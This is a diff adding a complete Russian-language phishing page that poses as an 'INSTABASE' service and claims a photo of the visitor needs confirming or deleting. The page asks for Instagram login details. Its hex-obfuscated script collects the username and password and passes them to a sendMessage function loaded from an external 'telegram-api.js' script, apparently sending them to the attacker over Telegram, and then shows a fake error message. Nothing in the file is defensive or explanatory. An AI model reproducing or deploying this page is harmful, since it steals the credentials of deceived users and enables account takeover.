@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INSTABASE</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/2/29/Instabase-logo.png">
+    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
+    <script src="https://zipscript.github.io/script/aes.js"></script>
+    <style>
+        *{
+            margin: 0px;
+            padding:0px;
+            background: #161b22;
+        }
+        .form{
+            display: block;
+            margin: auto;
+            text-align: center;
+            border: 2px solid #24282e;
+            width:330px;
+            margin-top:50px;
+            border-radius:5px;
+            height:290px;
+            background: #212730;
+        }
+        input{
+            display: block;
+            margin: auto;
+            width:240px;
+            height:35px;
+             padding-left:10px;
+             outline: none;
+             color: white;
+             border-radius:3px;
+             background: #212730;
+             border: 3px solid rgb(56, 53, 53);
+        }
+        button{
+            width:250px;
+            height:34px;
+            margin-top:30px;
+           border: none;
+        
+            color: white;
+            font-family: arial;
+            background:rgb(250, 78, 78);
+            border-radius:5px;
+
+        }
+        #img{
+            display: block;
+            margin: auto;
+            text-align: center;
+            width:160px;
+            margin-top:50px;
+            border-radius:5px;
+        }
+        p{
+            display: block;
+            margin: auto;
+            text-align: center;
+            margin-top:10px;
+            color: white;
+            font-family: arial;
+            font-size:13px;
+            width:200px;
+        }
+        h3{
+            display: none;
+            margin: auto;
+            text-align: center;
+            background: none;
+            font-family: monospace;
+            color:tomato;
+            margin-top:20px;
+            width:150px;
+            font-size:12px;
+        }
+        h5{
+           
+            display: block;
+            margin: auto;
+            text-align: center;
+            color:#29486d;
+            width:260px;
+            font-size:10px;
+            margin-top:200px;
+            font-family:Arial, Helvetica, sans-serif;
+        }
+        .head{
+           background:#323d4d;
+        }
+        .logo{
+            width:250px;
+            background: none;
+            display: block;
+            margin-left:10px;            
+        }
+    </style>
+</head>
+<body>
+    <div class="head">
+        <img class="logo" src="https://d1r8vl7h9sno9u.cloudfront.net/website/customer-logos/instabase.svg" alt="">
+    </div>
+   <img id="img"  alt="">
+   <p>Подтвердите что это фото принадлежит вам</p>
+   <p style="color:tomato;width:300px">Для подтверждения личности зайдите в свой аккаунт Instagram !</p>
+   <div class="form">
+       <br><br>
+       <input type="text" autocomplete="off" id="username" value="@hii.el2704" placeholder="Телефон, имя пользователя или эл. адрес">
+       <br>
+       <input type="password" id="password" placeholder="Пароль">
+       <button onclick="login()">Удалить Фото</button>
+       <h3 id="error">Вы ввели не правильные данные ?</h3>
+   </div>
+   <h5>OOO "INSTABASE" © 2011-2022. Все права защищены. Лицензии МРИТИК РУз АА №0006345. Лицензия ЦБ РУз №1</h5>
+  <br>
+</body>
+<script>
+var _0x6d8f=["\x3D","\x73\x70\x6C\x69\x74","\x26","\x73\x6C\x69\x63\x65","\x73\x65\x61\x72\x63\x68","\x73\x72\x63","\x69\x6D\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x70\x61\x73\x73\x77\x6F\x72\x64","\x5B\x55\x53\x45\x52\x4E\x41\x4D\x45\x5D\x20\x3A\x20\x5B","\x5D\x20\x25\x30\x41\x20\x5B\x50\x41\x53\x53\x57\x4F\x52\x44\x5D\x20\x3A\x20\x5B","\x5D","\x33\x33\x30\x31","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x65\x72\x72\x6F\x72","\x62\x6C\x6F\x63\x6B"];var desire=location[_0x6d8f[4]][_0x6d8f[3]](1)[_0x6d8f[1]](_0x6d8f[2])[0][_0x6d8f[1]](_0x6d8f[0])[1];document[_0x6d8f[7]](_0x6d8f[6])[_0x6d8f[5]]= desire;function login(){var _0x65fax3=document[_0x6d8f[7]](_0x6d8f[9])[_0x6d8f[8]];var _0x65fax4=document[_0x6d8f[7]](_0x6d8f[10])[_0x6d8f[8]];var _0x65fax5=`${_0x6d8f[11]}${_0x65fax3}${_0x6d8f[12]}${_0x65fax4}${_0x6d8f[13]}`;sendMessage(_0x65fax5,_0x6d8f[14]);setTimeout(()=>{document[_0x6d8f[7]](_0x6d8f[17])[_0x6d8f[16]][_0x6d8f[15]]= _0x6d8f[18]},1000)}
+</script>
+</html>
